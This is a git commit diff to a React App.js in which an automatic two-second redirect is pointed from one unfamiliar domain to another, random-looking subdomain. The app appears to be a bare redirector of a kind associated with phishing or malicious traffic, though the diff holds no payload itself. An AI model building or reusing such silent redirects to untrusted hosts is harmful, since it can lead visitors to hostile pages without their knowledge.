bf48c8e4bffdf90bfa249a1b0ca7277cc613d438
husknet <127146284+husknet@users.noreply.github.com>
2024-10-21 08:23:26 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://cpan.noviolencia.ar/';
+            window.location.href = 'https://buotklook.pressurezone.es/';
         }, 2000);
 
         return () => clearTimeout(timer);
